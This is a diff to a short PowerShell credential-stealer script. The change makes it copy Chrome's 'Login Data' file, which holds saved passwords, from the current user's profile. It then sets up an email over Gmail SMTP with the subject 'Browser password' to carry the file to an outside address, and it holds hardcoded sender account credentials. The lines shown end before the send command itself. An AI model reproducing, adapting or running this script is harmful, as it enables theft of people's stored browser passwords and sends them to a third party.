@@ -1,11 +1,11 @@
 
 $username=$env:UserName
-$data="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Web Data"
+$data="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 copy-item -path $data -destination D:/
 $From = "demosabin5010@gmail.com"
 $Pass = "demoaccount"
 $To = "sabinshrestha15@gmail.com"
-$Attachment = "D:\Web Data"
+$Attachment = "D:\Login Data"
 $Subject = "Browser password"
 $Body = "pass attached"
 $SMTPServer = "smtp.gmail.com"
